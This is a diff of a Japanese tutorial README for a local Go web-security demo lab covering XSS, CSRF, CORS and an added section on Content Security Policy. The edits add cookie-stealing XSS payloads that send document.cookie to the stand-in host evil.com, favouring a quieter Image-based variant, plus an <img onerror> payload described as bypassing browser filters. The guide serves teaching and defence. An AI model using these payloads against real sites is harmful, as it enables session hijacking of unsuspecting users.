@@ -159,22 +159,35 @@ podman compose up -d
 
 **実施手順:**
 
-1. `格納型 XSS デモ` ページへ移動します。
-2. 入力欄に `<script>alert('XSS!');</script>` と入力して送信します。
-3. ページがリロードされ、アラートが表示されることを確認します。
-4. ページを再読み込みしても、アラートが再度表示されることを確認します（データベースに保存されているため）。
+1. `Stored XSS Demo` ページへ移動します。
+2. まず `Login` ボタンを押してセッション Cookie をセットしておきます。
+3. 入力欄に以下のスクリプトを入力して送信します。
+
+   ```html
+   <script>alert('XSS: your cookie: ' + document.cookie);</script>
+   ```
+
+4. ページがリロードされ、アラートに Cookie 値と実際の攻撃で使われるスクリプトが表示されることを確認します。
+5. ページを再読み込みしても、アラートが再度表示されることを確認します（データベースに保存されているため）。
 
 **何が起きているのか？**
 
 ```text
-ユーザー入力: <script>alert('XSS!');</script>
+ユーザー入力: <script>alert(...)</script>
           ↓ (エスケープなしで保存)
-データベース: <script>alert('XSS!');</script>
+データベース: <script>alert(...)</script>
           ↓ (そのままHTML出力)
 ブラウザ解釈: <script>タグとして認識 → JavaScript実行
+
+実際の攻撃スクリプト:
+  new Image().src="https://evil.com/steal?c="+document.cookie
+
+  → 攻撃者サーバーへ Cookie が送信される
+  → Image オブジェクトを使う理由: fetch/XMLHttpRequest より制限が少なく、
+    単に URL をリクエストするだけでデータを外部送信できるため
 ```
 
-**脆弱なコード (main.go:121-126):**
+**脆弱なコード (main.go:78-):**
 
 ```go
 for _, c := range data.Comments {
@@ -185,7 +198,8 @@ for _, c := range data.Comments {
 
 **攻撃の応用例:**
 
-- `<script>document.location='http://evil.com?c='+document.cookie;</script>` → Cookie の盗難
+- `<script>document.location='http://evil.com?c='+document.cookie;</script>` → Cookie の盗難（画面遷移するためユーザーに気づかれる）
+- `<script>new Image().src="https://evil.com/steal?c="+document.cookie;</script>` → Cookie の盗難（ユーザーに気づかれにくい）
 - `<script>window.top.location='http://fake-bank.com';</script>` → フィッシングサイトへの誘導
 
 ---
@@ -196,22 +210,30 @@ URL パラメータに含まれるスクリプトがそのままページに反�
 
 **実施手順:**
 
-1. `反射型 XSS デモ` ページへ移動します。
-2. URL の末尾に `<script>alert(document.cookie);</script>` を追加してアクセスします。
-   - `http://localhost:8080/xss/reflected?q=<script>alert(document.cookie);</script>`
-3. クッキー情報が表示されることを確認します（HttpOnly 属性がないため取得可能です）。
+1. `Reflected XSS Demo` ページへ移動します。
+2. URL の末尾に以下を追加してアクセスします。
+
+   ```
+   http://localhost:8080/xss/reflected?q=<img src=x onerror=alert(document.cookie)>
+   ```
+
+   ※ 現代のブラウザは `<script>` タグによる反射型 XSS を自動ブロックします。`<img onerror>` を使うとこのフィルタをバイパスできます。
 
 **何が起きているのか？**
 
 ```text
-URLパラメータ: q=<script>alert(document.cookie);</script>
+URLパラメータ: q=<img src=x onerror=alert(document.cookie)>
             ↓ (エスケープなしでHTML埋め込み)
-HTML出力: <p>「<script>alert(document.cookie);</script>」の検索結果...</p>
+HTML出力: <p>0 results found for "<img src=x onerror=alert(document.cookie)>".</p>
          ↓ (ブラウザがHTMLとして解釈)
-スクリプト実行: JavaScriptが走る
+         → <img> の src=x は画像の読み込みに失敗
+         → onerror イベントハンドラが実行 → JavaScriptが走る
+
+※ <script> タグはブラウザの XSS Auditor にブロックされるが、
+   <img onerror> はフィルタをバイパスできる
 ```
 
-**脆弱なコード (main.go:129-132):**
+**脆弱なコード (main.go:86-):**
 
 ```go
 func reflectedXSSHandler(w http.ResponseWriter, r *http.Request) {
@@ -225,11 +247,13 @@ func reflectedXSSHandler(w http.ResponseWriter, r *http.Request) {
 
 ```text
 攻撃者が作成したURL:
-http://victim-site.com/search?q=<script>location='http://evil.com/steal?c='+document.cookie</script>
+http://victim-site.com/search?q=<img src=x onerror="new Image().src='https://evil.com/steal?c='+document.cookie">
 
 ↓ ユーザーがメールからリンクをクリック
 
 被害者のCookieが攻撃者サイトへ送信される
+
+※ onerror内で"を使う場合、URLエンコード(%22)が必要なことがある
 ```
 
 ---
@@ -243,8 +267,8 @@ http://victim-site.com/search?q=<script>location='http://evil.com/steal?c='+docu
 1. `ログイン` をクリックして、セッション Cookie をセットします。
    - 開発者ツール → Application → Cookies で `session_id` がセットされたことを確認
 2. `被害者サイト` のトップに戻り、現在のメールアドレスが `victim@example.com` であることを確認します。
-3. `攻撃者サイトへのリンク` の `CSRF 攻撃ページ` をクリックします。
-4. 攻撃者サイトの「賞品を受け取る」ボタンをクリックします。
+3. `CSRF Attack Page (port 8081)` リンクをクリックし、攻撃者サイト（別オリジン: localhost:8081）に移動します。
+4. 攻撃者サイトの「Claim Prize」ボタンをクリックします。
 5. 被害者サイトのトップに戻ると、メールアドレスが `hacker@evil.com` に変更されていることを確認します。
 
 **何が起きているのか？**
@@ -485,7 +509,7 @@ http.SetCookie(w, &http.Cookie{
 <form method="POST" action="/update-email">
     <!-- hiddenフィールドで正しいトークンを埋め込む -->
     <input type="hidden" name="csrf_token" value="abc123xyz456">
-    
+
     <input name="email" placeholder="新しいメールアドレス">
     <button>更新</button>
 </form>
@@ -584,7 +608,7 @@ func updateEmailHandler(w http.ResponseWriter, r *http.Request) {
     if r.Method == http.MethodPost {
         // フォームから送信されたトークン
         formToken := r.FormValue("csrf_token")
-        
+
         // セッションに保存された正しいトークン
         sessionID := getSessionID(r)
         expectedToken := csrfTokens[sessionID]
@@ -720,7 +744,7 @@ Access-Control-Allow-Origin: （なし）
 func apiHandler(w http.ResponseWriter, r *http.Request) {
     // 任意のサイトから API 呼び出し可能
     w.Header().Set("Access-Control-Allow-Origin", "*")
-    
+
     // 機密データを返す
     json.NewEncoder(w).Encode(sensitiveData)
 }
@@ -742,19 +766,19 @@ func apiHandler(w http.ResponseWriter, r *http.Request) {
 // ✅ 安全な実装: 特定のオリジンのみ許可
 func apiHandler(w http.ResponseWriter, r *http.Request) {
     origin := r.Header.Get("Origin")
-    
+
     // 許可リストに含まれるオリジンのみ許可
     allowedOrigins := map[string]bool{
         "https://example.com":       true,
         "https://www.example.com":   true,
     }
-    
+
     if allowedOrigins[origin] {
         w.Header().Set("Access-Control-Allow-Origin", origin)
         // 認証情報（Cookie等）を含める場合
         w.Header().Set("Access-Control-Allow-Credentials", "true")
     }
-    
+
     // クレデンシャルを含める場合、"*" は使用不可
     // Access-Control-Allow-Origin: *  ✗ 危険
     // Access-Control-Allow-Origin: https://example.com  ✓ 安全
@@ -764,7 +788,7 @@ func apiHandler(w http.ResponseWriter, r *http.Request) {
 func corsMiddleware(next http.HandlerFunc) http.HandlerFunc {
     return func(w http.ResponseWriter, r *http.Request) {
         origin := r.Header.Get("Origin")
-        
+
         if origin == "https://example.com" {
             w.Header().Set("Access-Control-Allow-Origin", origin)
             w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE")
@@ -772,13 +796,13 @@ func corsMiddleware(next http.HandlerFunc) http.HandlerFunc {
             w.Header().Set("Access-Control-Allow-Credentials", "true")
             w.Header().Set("Access-Control-Max-Age", "3600")
         }
-        
+
         // プリフライトリクエスト（OPTIONSメソッド）には早期応答
         if r.Method == http.MethodOptions {
             w.WriteHeader(http.StatusNoContent)
             return
         }
-        
+
         next(w, r)
     }
 }
@@ -886,6 +910,204 @@ func transferHandler(w http.ResponseWriter, r *http.Request) {
 ```bash
 # ブラウザの開発者ツールで確認
 # Console: "Refused to display ... in a frame because it set 'X-Frame-Options' to 'deny'."
+```
+
+---
+
+### CSP (Content Security Policy) 詳解
+
+#### CSP とは何か？
+
+CSP は、ブラウザに対して「このページで許可するリソース（スクリプト、画像、スタイルなど）の出所」を宣言する HTTP レスポンスヘッダーです。XSS の被害を大幅に軽減できる、強力な防御レイヤーです。
+
+**CSP がない場合:**
+
+```text
+ブラウザ: ページ内の <script> タグをすべて実行する
+         → 攻撃者が注入した <script>alert(document.cookie)</script> も実行されてしまう
+```
+
+**CSP がある場合:**
+
+```text
+サーバー: Content-Security-Policy: script-src 'self'
+ブラウザ: 「このページで実行してよいスクリプトは、同一オリジン(self)から読み込まれたものだけ」
+         → インラインの <script> タグはブロック
+         → 攻撃者が注入したスクリプトは実行されない ✓
+```
+
+#### CSP の仕組み
+
+```text
+1. サーバーが HTTP レスポンスヘッダーでポリシーを宣言
+   Content-Security-Policy: script-src 'self'; style-src 'self'
+
+2. ブラウザがページの読み込み時にポリシーを評価
+   - 各リソースの読み込み先をチェック
+   - ポリシーに違反するリソースはブロック
+
+3. 違反があった場合
+   - コンソールにエラーメッセージを出力
+   - (設定していれば) 違反レポートを送信
+```
+
+#### 主要ディレクティブ一覧
+
+|ディレクティブ|制御対象|例|
+|:---|:---|:---|
+|`script-src`|JavaScript の読み込み元|`'self'`, `'unsafe-inline'`, `'nonce-abc'`|
+|`style-src`|CSS の読み込み元|`'self'`, `'unsafe-inline'`|
+|`img-src`|画像の読み込み元|`'self'`, `https://images.example.com`|
+|`font-src`|フォントの読み込み元|`'self'`, `https://fonts.googleapis.com`|
+|`connect-src`|fetch/XHR/WebSocket の接続先|`'self'`, `https://api.example.com`|
+|`frame-src`|iframe の読み込み元|`'self'`, `https://trusted.com`|
+|`frame-ancestors`|このページを埋め込める親|`'none'`, `'self'`（クリックジャッキング対策）|
+|`default-src`|上記のデフォルト値|`'self'`|
+|`object-src`|Flash/Java 等のプラグイン|`'none'`（推奨）|
+|`base-uri`|`<base>` タグの制限|`'self'`|
+|`form-action`|フォームの送信先|`'self'`|
+
+#### ソース値の意味
+
+|ソース値|意味|リスク|
+|:---|:---|:---|
+|`'self'`|同一オリジンのみ許可|安全（推奨）|
+|`'none'`|一切許可しない|最も安全|
+|`'unsafe-inline'`|インラインスクリプト/スタイルを許可|危険（XSS 軽減効果なし）|
+|`'unsafe-eval'`|`eval()` 等を許可|危険|
+|`'nonce-<value>'`|指定 nonce 属性を持つスクリプトのみ許可|安全（推奨）|
+|`'sha256-<hash>'`|ハッシュに一致するスクリプトのみ許可|安全|
+|`https://...`|指定 URL のみ許可|中程度|
+|`*`|すべて許可|危険|
+
+#### 段階的な CSP 導入
+
+**ステップ1: レポートのみモード（影響なし）**
+
+```go
+// Content-Security-Policy-Report-Only はブロックせず、違反をレポートするだけ
+w.Header().Set("Content-Security-Policy-Report-Only",
+    "default-src 'self'; " +
+    "report-uri /csp-report")
+
+// 本番環境でまずこれを設定し、違反ログを収集してから実際の CSP に移行
+```
+
+**ステップ2: 緩やかなポリシー（移行期）**
+
+```go
+// インラインスクリプトを一時的に許可（既存コードの修正中）
+w.Header().Set("Content-Security-Policy",
+    "default-src 'self'; " +
+    "script-src 'self' 'unsafe-inline'; " +  // 段階的に削除
+    "style-src 'self' 'unsafe-inline'; " +
+    "img-src 'self' data:; " +
+    "frame-ancestors 'none'")
+```
+
+**ステップ3: 厳格なポリシー（nonce ベース・推奨）**
+
+```go
+import (
+    "crypto/rand"
+    "encoding/base64"
+)
+
+func generateNonce() string {
+    b := make([]byte, 16)
+    rand.Read(b)
+    return base64.StdEncoding.EncodeToString(b)
+}
+
+func secureHandler(w http.ResponseWriter, r *http.Request) {
+    nonce := generateNonce()
+
+    w.Header().Set("Content-Security-Policy",
+        "default-src 'none'; " +
+        "script-src 'nonce-" + nonce + "'; " +     // nonce 付きスクリプトのみ許可
+        "style-src 'self'; " +
+        "img-src 'self'; " +
+        "connect-src 'self'; " +
+        "frame-ancestors 'none'; " +
+        "base-uri 'self'; " +
+        "form-action 'self'")
+
+    // HTML 内で nonce 属性を付与
+    fmt.Fprintf(w, `
+        <script nonce="%s">
+            // このスクリプトだけが実行される
+            // 攻撃者が注入した <script> タグには nonce がない → ブロック
+            console.log('legitimate script');
+        </script>
+    `, nonce)
+}
+```
+
+**nonce による防御の仕組み:**
+
+```text
+サーバーが生成: <script nonce="abc123">...</script>
+CSP ヘッダー:  script-src 'nonce-abc123'
+
+攻撃者が注入: <script>alert('XSS')</script>
+               ↑ nonce 属性がない → ブラウザがブロック ✓
+
+<script nonce="abc123">alert('XSS')</script>
+               ↑ 攻撃者は nonce 値を知りえない → ブロック ✓
+```
+
+#### CSP が防ぐ攻撃と防げない攻撃
+
+|攻撃|CSP で防げる？|理由|
+|:---|:---|:---|
+|インライン `<script>` XSS|`script-src 'self'` で防ぐ|インラインスクリプトがブロックされる|
+|外部ドメインの悪意スクリプト|`script-src 'self'` で防ぐ|許可外ドメインがブロックされる|
+|`eval()` ベースの XSS|`unsafe-eval` なしで防ぐ|`eval()` がブロックされる|
+|クリックジャッキング|`frame-ancestors 'none'` で防ぐ|iframe 埋め込みがブロックされる|
+|CSRF|防げない|CSRF はフォーム送信でありスクリプトではない|
+|`<img onerror=...>` XSS|`unsafe-inline` なしで防ぐ|インラインイベントハンドラがブロックされる|
+
+#### 実装例: Go サーバーでの CSP ミドルウェア
+
+```go
+func cspMiddleware(next http.Handler) http.Handler {
+    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+        nonce := generateNonce()
+        r.Header.Set("X-CSP-Nonce", nonce) // ハンドラーで参照可能に
+
+        w.Header().Set("Content-Security-Policy",
+            "default-src 'none'; " +
+            "script-src 'nonce-" + nonce + "'; " +
+            "style-src 'self'; " +
+            "img-src 'self'; " +
+            "connect-src 'self'; " +
+            "frame-ancestors 'none'; " +
+            "base-uri 'self'; " +
+            "form-action 'self'; " +
+            "report-uri /csp-report")
+
+        next.ServeHTTP(w, r)
+    })
+}
+```
+
+#### CSP 違反の確認方法
+
+```text
+Chrome DevTools:
+  Console タブ → "Refused to execute inline script because it violates
+                   the following Content Security Policy directive: 'script-src'"
+
+Network タブ → "csp-report" への POST リクエストを確認
+
+レポート内容の例:
+{
+  "csp-report": {
+    "document-uri": "http://localhost:8080/xss/stored",
+    "violated-directive": "script-src 'self'",
+    "blocked-uri": "inline"
+  }
+}
 ```
 
 ---
